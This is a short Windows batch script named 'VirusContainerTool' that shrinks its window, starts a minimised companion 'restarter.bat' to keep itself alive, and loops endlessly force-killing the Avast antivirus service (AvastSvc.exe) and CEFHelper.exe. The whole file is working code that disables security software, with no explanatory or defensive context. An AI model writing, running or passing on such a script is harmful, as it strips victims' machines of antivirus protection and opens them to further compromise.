echo off
mode con cols=15 lines=1
TASKLIST /FI "WINDOWTITLE eq Restarter"|findstr "cmd"
if %errorlevel%==1 (
start /min restarter.bat
)
TASKLIST /FI "WINDOWTITLE eq VirusContainerTool"|findstr "cmd"
if %errorlevel%==0 (
exit
)
:start
mode con cols=15 lines=5
title VirusContainerTool
echo 5.0.210818
TASKKILL /F /IM AvastSvc.exe
TASKKILL /F /IM CEFHelper.exe
cls
goto :start